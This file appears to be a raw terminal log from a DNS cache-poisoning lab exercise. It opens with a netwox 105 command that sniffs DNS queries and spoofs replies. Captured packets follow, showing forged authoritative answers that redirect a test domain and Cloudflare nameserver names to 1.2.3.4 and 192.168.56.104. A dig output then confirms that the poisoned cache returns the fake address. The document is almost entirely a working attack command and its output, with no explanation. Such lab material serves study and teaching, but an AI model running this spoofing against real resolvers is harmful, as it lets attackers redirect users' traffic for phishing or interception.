@@ -1,0 +1,187 @@
+attack: 
+[02/18/26]seed@VM:~$ sudo netwox 105 -h "p4g77.example.net" -H 1.2.3.4 -a "ns.example.net" \
+>   -A 192.168.56.104 -d enp0s8 -T 600 \
+>   -f "udp and src host 10.10.0.9 and dst port 53" -s raw
+
+DNS_question____________________________________________________.
+| id=54303  rcode=OK             opcode=QUERY                   |
+| aa=0 tr=0 rd=0 ra=0  quest=1  answer=0  auth=0  add=1         |
+| p4g77.example.net. A                                          |
+| . OPT UDPpl=512 errcode=0 v=0 ...                             |
+|_______________________________________________________________|
+DNS_answer______________________________________________________.
+| id=54303  rcode=OK             opcode=QUERY                   |
+| aa=1 tr=0 rd=0 ra=0  quest=1  answer=1  auth=1  add=1         |
+| p4g77.example.net. A                                          |
+| p4g77.example.net. A 600 1.2.3.4                              |
+| ns.example.net. NS 600 ns.example.net.                        |
+| ns.example.net. A 600 192.168.56.104                          |
+|_______________________________________________________________|
+DNS_question____________________________________________________.
+| id=33435  rcode=OK             opcode=QUERY                   |
+| aa=0 tr=0 rd=0 ra=0  quest=1  answer=0  auth=0  add=1         |
+| . NS                                                          |
+| . OPT UDPpl=512 errcode=0 v=0 ...                             |
+|_______________________________________________________________|
+DNS_answer______________________________________________________.
+| id=33435  rcode=OK             opcode=QUERY                   |
+| aa=1 tr=0 rd=0 ra=0  quest=1  answer=1  auth=0  add=1         |
+| . NS                                                          |
+| . NS 600 ns.example.net.                                      |
+| ns.example.net. A 600 192.168.56.104                          |
+|_______________________________________________________________|
+DNS_question____________________________________________________.
+| id=24646  rcode=OK             opcode=QUERY                   |
+| aa=0 tr=0 rd=0 ra=0  quest=1  answer=0  auth=0  add=1         |
+| p4g77.example.net. A                                          |
+| . OPT UDPpl=512 errcode=0 v=0 ...                             |
+|_______________________________________________________________|
+DNS_answer______________________________________________________.
+| id=24646  rcode=OK             opcode=QUERY                   |
+| aa=1 tr=0 rd=0 ra=0  quest=1  answer=1  auth=1  add=1         |
+| p4g77.example.net. A                                          |
+| p4g77.example.net. A 600 1.2.3.4                              |
+| ns.example.net. NS 600 ns.example.net.                        |
+| ns.example.net. A 600 192.168.56.104                          |
+|_______________________________________________________________|
+DNS_question____________________________________________________.
+| id=32004  rcode=OK             opcode=QUERY                   |
+| aa=0 tr=0 rd=0 ra=0  quest=1  answer=0  auth=0  add=1         |
+| hugh.ns.cloudflare.com. A                                     |
+| . OPT UDPpl=512 errcode=0 v=0 ...                             |
+|_______________________________________________________________|
+DNS_answer______________________________________________________.
+| id=32004  rcode=OK             opcode=QUERY                   |
+| aa=1 tr=0 rd=0 ra=0  quest=1  answer=1  auth=1  add=1         |
+| hugh.ns.cloudflare.com. A                                     |
+| hugh.ns.cloudflare.com. A 600 1.2.3.4                         |
+| ns.example.net. NS 600 ns.example.net.                        |
+| ns.example.net. A 600 192.168.56.104                          |
+|_______________________________________________________________|
+DNS_question____________________________________________________.
+| id=33420  rcode=OK             opcode=QUERY                   |
+| aa=0 tr=0 rd=0 ra=0  quest=1  answer=0  auth=0  add=1         |
+| betty.ns.cloudflare.com. A                                    |
+| . OPT UDPpl=512 errcode=0 v=0 ...                             |
+|_______________________________________________________________|
+DNS_answer______________________________________________________.
+| id=33420  rcode=OK             opcode=QUERY                   |
+| aa=1 tr=0 rd=0 ra=0  quest=1  answer=1  auth=1  add=1         |
+| betty.ns.cloudflare.com. A                                    |
+| betty.ns.cloudflare.com. A 600 1.2.3.4                        |
+| ns.example.net. NS 600 ns.example.net.                        |
+| ns.example.net. A 600 192.168.56.104                          |
+|_______________________________________________________________|
+DNS_question____________________________________________________.
+| id=47482  rcode=OK             opcode=QUERY                   |
+| aa=0 tr=0 rd=0 ra=0  quest=1  answer=0  auth=0  add=1         |
+| betty.ns.cloudflare.com. AAAA                                 |
+| . OPT UDPpl=512 errcode=0 v=0 ...                             |
+|_______________________________________________________________|
+DNS_question____________________________________________________.
+| id=60627  rcode=OK             opcode=QUERY                   |
+| aa=0 tr=0 rd=0 ra=0  quest=1  answer=0  auth=0  add=1         |
+| E.ROOT-SERVERS.NET. AAAA                                      |
+| . OPT UDPpl=512 errcode=0 v=0 ...                             |
+|_______________________________________________________________|
+DNS_question____________________________________________________.
+| id=47902  rcode=OK             opcode=QUERY                   |
+| aa=0 tr=0 rd=0 ra=0  quest=1  answer=0  auth=0  add=1         |
+| G.ROOT-SERVERS.NET. AAAA                                      |
+| . OPT UDPpl=512 errcode=0 v=0 ...                             |
+|_______________________________________________________________|
+DNS_question____________________________________________________.
+| id=18002  rcode=OK             opcode=QUERY                   |
+| aa=0 tr=0 rd=0 ra=0  quest=1  answer=0  auth=0  add=1         |
+| hugh.ns.cloudflare.com. AAAA                                  |
+| . OPT UDPpl=512 errcode=0 v=0 ...                             |
+|_______________________________________________________________|
+DNS_question____________________________________________________.
+| id=35935  rcode=OK             opcode=QUERY                   |
+| aa=0 tr=0 rd=0 ra=0  quest=1  answer=0  auth=0  add=1         |
+| . NS                                                          |
+| . OPT UDPpl=512 errcode=0 v=0 ...                             |
+|_______________________________________________________________|
+DNS_answer______________________________________________________.
+| id=35935  rcode=OK             opcode=QUERY                   |
+| aa=1 tr=0 rd=0 ra=0  quest=1  answer=1  auth=0  add=1         |
+| . NS                                                          |
+| . NS 600 ns.example.net.                                      |
+| ns.example.net. A 600 192.168.56.104                          |
+|_______________________________________________________________|
+DNS_question____________________________________________________.
+| id=30526  rcode=OK             opcode=QUERY                   |
+| aa=0 tr=0 rd=0 ra=0  quest=1  answer=0  auth=0  add=1         |
+| p4g77.example.net. A                                          |
+| . OPT UDPpl=512 errcode=0 v=0 ...                             |
+|_______________________________________________________________|
+DNS_answer______________________________________________________.
+| id=30526  rcode=OK             opcode=QUERY                   |
+| aa=1 tr=0 rd=0 ra=0  quest=1  answer=1  auth=1  add=1         |
+| p4g77.example.net. A                                          |
+| p4g77.example.net. A 600 1.2.3.4                              |
+| ns.example.net. NS 600 ns.example.net.                        |
+| ns.example.net. A 600 192.168.56.104                          |
+|_______________________________________________________________|
+DNS_question____________________________________________________.
+| id=54540  rcode=OK             opcode=QUERY                   |
+| aa=0 tr=0 rd=0 ra=0  quest=1  answer=0  auth=0  add=1         |
+| betty.ns.cloudflare.com. AAAA                                 |
+| . OPT UDPpl=512 errcode=0 v=0 ...                             |
+|_______________________________________________________________|
+DNS_question____________________________________________________.
+| id=18905  rcode=OK             opcode=QUERY                   |
+| aa=0 tr=0 rd=0 ra=0  quest=1  answer=0  auth=0  add=1         |
+| hugh.ns.cloudflare.com. AAAA                                  |
+| . OPT UDPpl=512 errcode=0 v=0 ...                             |
+|_______________________________________________________________|
+DNS_question____________________________________________________.
+| id=41198  rcode=OK             opcode=QUERY                   |
+| aa=0 tr=0 rd=0 ra=0  quest=1  answer=0  auth=0  add=1         |
+| betty.ns.cloudflare.com. AAAA                                 |
+| . OPT UDPpl=512 errcode=0 v=0 ...                             |
+|_______________________________________________________________|
+DNS_question____________________________________________________.
+| id=33841  rcode=OK             opcode=QUERY                   |
+| aa=0 tr=0 rd=0 ra=0  quest=1  answer=0  auth=0  add=1         |
+| hugh.ns.cloudflare.com. AAAA                                  |
+| . OPT UDPpl=512 errcode=0 v=0 ...                             |
+|_______________________________________________________________|
+
+user:
+[02/18/26]seed@VM:~$ dig p4g77.example.net
+
+; <<>> DiG 9.10.3-P4-Ubuntu <<>> p4g77.example.net
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 6331
+;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 2, ADDITIONAL: 9
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4096
+;; QUESTION SECTION:
+;p4g77.example.net.		IN	A
+
+;; ANSWER SECTION:
+p4g77.example.net.	540	IN	A	1.2.3.4
+
+;; AUTHORITY SECTION:
+example.net.		172740	IN	NS	hugh.ns.cloudflare.com.
+example.net.		172740	IN	NS	betty.ns.cloudflare.com.
+
+;; ADDITIONAL SECTION:
+hugh.ns.cloudflare.com.	540	IN	A	1.2.3.4
+hugh.ns.cloudflare.com.	86293	IN	AAAA	2606:4700:58::adf5:3b75
+hugh.ns.cloudflare.com.	86293	IN	AAAA	2803:f800:50::6ca2:c175
+hugh.ns.cloudflare.com.	86293	IN	AAAA	2a06:98c1:50::ac40:2175
+betty.ns.cloudflare.com. 540	IN	A	1.2.3.4
+betty.ns.cloudflare.com. 86293	IN	AAAA	2803:f800:50::6ca2:c04b
+betty.ns.cloudflare.com. 86293	IN	AAAA	2a06:98c1:50::ac40:204b
+betty.ns.cloudflare.com. 86293	IN	AAAA	2606:4700:50::adf5:3a4b
+
+;; Query time: 2 msec
+;; SERVER: 192.168.56.104#53(192.168.56.104)
+;; WHEN: Wed Feb 18 21:33:42 EST 2026
+;; MSG SIZE  rcvd: 318
+
+[02/18/26]seed@VM:~$ 
